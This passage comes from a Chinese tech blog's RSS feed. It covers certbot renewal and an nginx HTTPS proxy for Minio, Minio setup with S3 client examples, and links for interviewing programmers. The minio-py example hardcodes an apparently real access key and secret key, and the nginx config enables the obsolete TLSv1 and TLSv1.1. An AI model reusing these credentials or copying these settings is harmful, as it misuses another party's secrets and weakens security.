&lt;ul&gt;
&lt;li&gt;sudo tree /etc/letsencrypt/live/&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;证书续签&lt;/h3&gt;
&lt;p&gt;证书的失效期是3个月，&lt;/p&gt;
&lt;p&gt;续签的命令为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;./certbot-auto renew 或&lt;/li&gt;
&lt;li&gt;./certbot-auto renew --standalone --pre-hook "service nginx stop" --post-hook "service nginx start"&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以用cron添加一个定时任务，自动续签。&lt;/p&gt;
&lt;h3&gt;将证书用于nginx&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;upstream minio_server {
            server 127.0.0.1:9000 fail_timeout=0;
    }

# 监听 HTTPS 请求
server {
        #server_name example.com;
        listen 8443 ssl;

        # TLS 基本设置
        ssl_certificate /etc/letsencrypt/live/www.just4fun.site/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/www.just4fun.site/privkey.pem;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;

        # 网站的其它设置不变
        # [...]
  location / {
        try_files $uri @proxy_to_app;
  }

  # No basic auth security on the heartbeat url, so that ELB can use it


  location @proxy_to_app {
    proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;
    proxy_set_header X-Forwarded-Port $http_x_forwarded_port;
    proxy_set_header X-Forwarded-For $http_x_forwarded_for;
    proxy_set_header Host $http_host;

    proxy_redirect off;
    proxy_pass http://minio_server;
  }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;当然我们可以将任意端口用于https，不过证书无法移植到其他服务器（可能是我还不熟悉）&lt;/p&gt;
&lt;p&gt;访问https://www.just4fun.site:18443，一切正常（我在青云的路由器上将8443端口映射为18443）&lt;/p&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE"&gt;超文本传输安全协议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0"&gt;传输层安全协议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html"&gt;SSL/TLS协议运行机制的概述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/certbot/certbot"&gt;certbot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.windrunner.info/sa/lets-encrypt.html"&gt;使用 Let's Encrypt 生成免费的 SSL 证书&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://linuxtoy.org/archives/certbot.html"&gt;Certbot：自动部署 Let's Encrypt 证书&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 19 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-19:https-note.html</guid><category>tools</category></item><item><title>构建类s3存储系统（Minio）</title><link>/install-Minio-Cloud-Storage.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;Open edX跟S3有许多整合，包括日志的存储，成绩单的存储，静态文件的存储和加速等，当然需要开启才被采用.亚马逊的服务真是业界标杆式的存在，一旦用过，便曾经沧海。&lt;/p&gt;
&lt;p&gt;可惜我们与S3无缘。&lt;/p&gt;
&lt;p&gt;后来想做edxapp负载均衡的时候，又想到这个问题，edxapp是有状态的，主要是涉及静态文件的时候，所以想用s3的开源实现，来替代S3，如此一来可以让代码的修改降到最低。把静态文件挪到云中，edxapp就无状态了&lt;/p&gt;
&lt;p&gt;github一番，也没找到特别合适的，所以用了七牛来替代，七牛的直传功能很不错，而且有各个平台的sdk！&lt;/p&gt;
&lt;h1&gt;S3的开源实现&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/jubos/fake-s3"&gt;fake-s3&lt;/a&gt;：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The goal of Fake S3 is to minimize runtime dependencies and be more of a development tool to test S3 calls in your code rather than a production server looking to duplicate S3 functionality. Trying RiakCS, ParkPlace/Boardwalk, or Ceph might be a place to start if that is your goal.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知，fake-s3适合看做一个开发测试环境，而不是生产可用的环境，类s3的生产系统，可以试试：RiakCS, ParkPlace/Boardwalk, or Ceph&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/minio/minio"&gt;minio&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Minio is an object storage server compatible with Amazon S3 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;minio&lt;/h1&gt;
&lt;h3&gt;minio是什么&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Unlike databases, Minio stores objects such as photos, videos, log files, backups, container / VM images and so on. Minio is best suited for storing blobs of information ranging from KBs to 5 TBs each. In a simplistic sense, it is like a FTP server with a simple get / put API over HTTP.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;minio是Go实现的一个类s3服务，和大多go项目一样，干净小巧，没有依赖，整个就一可运行。便利之极&lt;/p&gt;
&lt;h3&gt;不足&lt;/h3&gt;
&lt;p&gt;目前minio还很年轻，使用过程我遇到过一些bug&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;web端没有用户概念，当然可以采用sdk来自行构建，稍后我会演示python的例子&lt;/li&gt;
&lt;li&gt;上传的文件不完整（损坏）&lt;/li&gt;
&lt;li&gt;提示上传成功后，却不予显示&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;构建外部存储系统的实践&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blog.minio.io/object-storage-in-practice-creating-a-reliable-data-store-9b424a22e8e"&gt;Object storage in practice: Creating a reliable data store&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章讨论了这样一种思路， 把存储任务分离出去，只留下 putObject()和 getObject()接口&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;files sit in the object store, metadata goes to the database&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不过这里没有用到直传&lt;/p&gt;
&lt;h3&gt;安装与启动&lt;/h3&gt;
&lt;p&gt;过程简单至极&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;curl -O https://dl.minio.io/server/minio/release/linux-amd64/minio&lt;/li&gt;
&lt;li&gt;chmod +x minio&lt;/li&gt;
&lt;li&gt;./minio --help&lt;/li&gt;
&lt;li&gt;./minio server /tmp/test&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="minio" src="http://7xrc4h.com1.z0.glb.clouddn.com/MINIO.png?imageView2/2/w/1000" /&gt;&lt;/p&gt;
&lt;h3&gt;配置&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://docs.minio.io/docs/minio-server-configuration-files-guide"&gt;Minio Server Configuration Files Guide&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;存储结构&lt;/h3&gt;
&lt;p&gt;就是原始目录，很好地与其他整合（诸如nginx）&lt;/p&gt;
&lt;h3&gt;可能的场景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;作为内容管理平台是完备的&lt;/li&gt;
&lt;li&gt;作为用户级别的资源管理平台（诸如视频的管理平台，播放使用nginx），还有些问题&lt;/li&gt;
&lt;li&gt;没有用户级别的权限&lt;/li&gt;
&lt;li&gt;没有用户系统&lt;/li&gt;
&lt;li&gt;可能的出路&lt;ul&gt;
&lt;li&gt;期待之后有用户系统，可以对接到cas/oauth2&lt;/li&gt;
&lt;li&gt;在nginx这里加一层？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;也许你期待的云盘，可以试试seafile和owncloud&lt;/li&gt;
&lt;li&gt;作为抽象存储服务，采用sdk才做这个服务，可以想象为局域网中的七牛，不足是没有webhook（callback）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;client/sdk&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://minio.io/download/#minio-client"&gt;minio-client&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/minio/mc"&gt;mc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/minio/minio-py"&gt;minio-py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/minio/minio-py/blob/master/API.md#presigned_post_policy"&gt;presigned_post_policy&lt;/a&gt; 控制权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;采用s3客户端&lt;/h3&gt;
&lt;p&gt;有没有可能采用s3的生态链，诸如上传前端&lt;/p&gt;
&lt;h4&gt;s3cmd&lt;/h4&gt;
&lt;p&gt;sudo pip install s3cmd&lt;/p&gt;
&lt;p&gt;创建~/.s3cfg&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;host_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; http://s3.just4fun.site/
&lt;span class="nv"&gt;host_bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; http://s3.just4fun.site/
&lt;span class="nv"&gt;access_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; xxx
&lt;span class="nv"&gt;secret_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; xxx
&lt;span class="nv"&gt;signature_v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;bucket_location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; us-east-1
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;s3cmd mb s3://www.just4fun.com  &lt;span class="c1"&gt;#create&lt;/span&gt;
s3cmd ls
s3cmd ls s3://www.just4fun.com 
s3cmd put some-file.xml s3://www.just4fun.com /somefile.xml
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;awscli&lt;/h3&gt;
&lt;p&gt;pip install awscli&lt;/p&gt;
&lt;p&gt;文档：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;http://docs.aws.amazon.com/cli/latest/reference/s3/index.html &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws configure //配置文件位置在哪里 ~/.aws/
aws configure &lt;span class="nb"&gt;set&lt;/span&gt; default.s3.signature_version s3v4
aws --endpoint-url http://s3.just4fun.site s3 ls
aws --endpoint-url http://s3.just4fun.site s3 ls  //list your buckets
aws --endpoint-url http://s3.just4fun.site s3 ls  s3://edx  // list contents inside bucket
aws --endpoint-url http://s3.just4fun.site  s3 mb s3://mybucket   // make a bucket
aws --endpoint-url http://s3.just4fun.site s3 cp /tmp/aa.html s3://mybucket //add an object to a bucket
aws  s3api list-objects --bucket edx --query Contents&lt;span class="o"&gt;[]&lt;/span&gt;.&lt;span class="o"&gt;[&lt;/span&gt;Key,Size&lt;span class="o"&gt;]&lt;/span&gt; --endpoint-url http://s3.just4fun.site  //列出文件大小
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;前端上传：&lt;a href="https://github.com/FineUploader/fine-uploader"&gt;fine-uploader&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://fineuploader.com/demos.html#amazon-demo"&gt;demo&lt;/a&gt;:是否支持回调 类似七牛 s3支持，minio不确定&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前端通过凭证操作，这是后端sdk构建的，和存储层无关&lt;/p&gt;
&lt;h4&gt;boto&lt;/h4&gt;
&lt;p&gt;edx是用boto，不过boto和s3耦合，不容易替换为s3开源实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;boto.s3.connection&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;S3Connection&lt;/span&gt;  &lt;span class="c1"&gt;#可查看细节，可以不连默认host&lt;/span&gt;
&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt; 
&lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;S3Connection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;secret&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s3.just4fun.site&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;is_secure&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以试试&lt;a href="https://github.com/boto/botocore/issues/424"&gt;这里&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;2016.09.18更新&lt;/p&gt;
&lt;p&gt;&lt;a href="https://docs.minio.io/docs/how-to-use-aws-sdk-for-python-with-minio-server"&gt;How to use AWS SDK for Python with Minio Server&lt;/a&gt;给出了boto3中可以如何十一minio替代s3&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;构建带有身份的存储系统&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;minio仅仅视为存储层&lt;/li&gt;
&lt;li&gt;采用&lt;a href="https://github.com/minio/minio-py#presigned-operations"&gt;Presigned Operations&lt;/a&gt;,控制细粒度的存储，上传凭证是核心所在&lt;/li&gt;
&lt;li&gt;之后采用通用的上传前端&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;凭证相关：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timedelta&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;minio&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Minio&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;minio&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;PostPolicy&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;minio.error&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ResponseError&lt;/span&gt;

&lt;span class="n"&gt;post_policy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PostPolicy&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# set bucket name location for uploads.&lt;/span&gt;
&lt;span class="n"&gt;post_policy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_bucket_name&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# set key prefix for all incoming uploads.&lt;/span&gt;
&lt;span class="n"&gt;post_policy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_key_startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# set content length for incoming uploads.&lt;/span&gt;
&lt;span class="n"&gt;post_policy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_content_length_range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# set expiry 10 days into future.&lt;/span&gt;
&lt;span class="n"&gt;expires_date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;timedelta&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;days&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;post_policy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_expires&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;expires_date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Minio&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s3.just4fun.site&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;# 默认采用的是https，否则报错&lt;/span&gt;
               &lt;span class="n"&gt;access_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AN0GSB29FGW7UXQ6WIEM&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;secret_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Wyyzr8/D5lEOoCfZymID4ZG/PNhb6th7YAdVT/Zs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;url_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signed_form_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;presigned_post_policy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;post_policy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signed_form_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;curl -X POST {0}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curl_str&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;signed_form_data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;curl_cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-F {0}={1}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signed_form_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;

        &lt;span class="c1"&gt;# print curl command to upload files.&lt;/span&gt;
        &lt;span class="n"&gt;curl_cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-F file=@/tmp/aa.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;curl_cmd&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;ResponseError&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;问题&lt;/h1&gt;
&lt;p&gt;支持多用户吗？&lt;/p&gt;
&lt;p&gt;ACCESSKEYID是全局只有一个？无法天然支持多client？需要在应用逻辑里做？&lt;/p&gt;
&lt;p&gt;可以使用这个机制:&lt;a href="https://docs.minio.io/docs/upload-files-from-browser-using-pre-signed-urls"&gt;Upload files from browser using pre-signed URLs&lt;/a&gt;，类似七牛&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 19 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-19:install-Minio-Cloud-Storage.html</guid><category>技术</category></item><item><title>如何面试程序员</title><link>/about-interview.html</link><description>&lt;p&gt;最近在客串面试官的角色，收集一些自己认为不错的资源和问题。&lt;/p&gt;
&lt;p&gt;面试别人比被人面试来得紧张&lt;/p&gt;
&lt;h1&gt;原则&lt;/h1&gt;
&lt;p&gt;你需要找到合适的人，而不是最牛的人&lt;/p&gt;
&lt;h1&gt;技术无关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/12/how_to_interview_a_programmer.html"&gt;如何面试程序员？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备工作&lt;ul&gt;
&lt;li&gt;需要新员工完成什么样的任务？&lt;/li&gt;
&lt;li&gt;怎样的人能完成这样的任务？&lt;/li&gt;
&lt;li&gt;哪些途径和方法可以发现这样的人？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察专业能力&lt;ul&gt;
&lt;li&gt;过去是未来的最好预测依据。不过，提问的重点不要仅仅是他过去的成果，更要关注在当时的环境中，他是如何决策和实施的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察综合素质:因为人是会发展的，所以某种程度上，面试者的综合素质要比他的专业能力更重要&lt;ul&gt;
&lt;li&gt;你为什么开发软件？&lt;/li&gt;
&lt;li&gt;去年你读了几本技术书籍？&lt;/li&gt;
&lt;li&gt;去年你最喜欢的技术书籍是哪本？你从中学到了什么？&lt;/li&gt;
&lt;li&gt;平时你经常访问哪些编程类网站？&lt;/li&gt;
&lt;li&gt;你有自己的开源项目吗？业余时间你编程吗？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察理性思维（递进）&lt;ul&gt;
&lt;li&gt;你最喜欢的编程语言是哪种？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你为这种语言加一种功能，你会加什么功能？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你取消一种功能，会是什么功能？为什么？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.zhihu.com/question/20042950"&gt;如何面试一个工作经验比自己高很多的人？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是技术岗，应该有岗位职责和技术要求，你作为技术面试官就是要看他已有的技能是否满足这个岗位。要围绕公司所应用的技术平台、产品类型、项目情况考察他的技术水准是否能够满足。&lt;/li&gt;
&lt;li&gt;对于你不了解的技术你也不要不懂装懂，如果他能用简单的描述让你听得明白，说明他的条理很清晰&lt;/li&gt;
&lt;li&gt;你可以提出几个实际工作中遇到的技术问题，请他讲讲他的理解和解决办法。&lt;/li&gt;
&lt;li&gt;技术面试之后，要了解他换工作的原因，动机，他的期望是什么，你要判断公司能否满足他的期望，他是否“像这个公司的人”，也就是要符合公司文化。双方契合，才能达到&lt;strong&gt;共赢&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;我所在单位的面试是逐级的，首先技术部门经理面试，然后技术部门上级单位总经理面试，最后和HR部门经理谈薪酬待遇。&lt;/li&gt;
&lt;li&gt;找出过去曾经困扰过你或你们团队的问题（可以是技术、运营、沟通），列明产生问题的背景，在面试中用于情景模拟&lt;/li&gt;
&lt;li&gt;询问项目过程中发生的技术难关、跨团队沟通等问题的解决上，用STAR判断真假&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/subview/470818/11235965.htm#viewPageContent"&gt;STAR原则&lt;/a&gt;:situation,task,action,result&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;鉴于IT行业的特殊性，还需要考察学习能力，可以直接询问他是如何学习最新语言的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/"&gt;怎样花两年时间去面试一个人&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;面试官的养成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/26240321"&gt;如何当一个好的面试官？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36820925"&gt;在面试中，有哪些面试官的反应让你感觉惊艳？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/19551593"&gt;创业公司应该如何招人？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技术相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions"&gt;Front-end-Developer-Interview-Questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alex/what-happens-when"&gt;what-happens-when&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/skyline75489/what-happens-when-zh_CN"&gt;What-happens-when&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions"&gt;awesome-interview-questions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#html"&gt;html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#javascript"&gt;javascript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#python"&gt;python&lt;/a&gt;&lt;ul&gt;
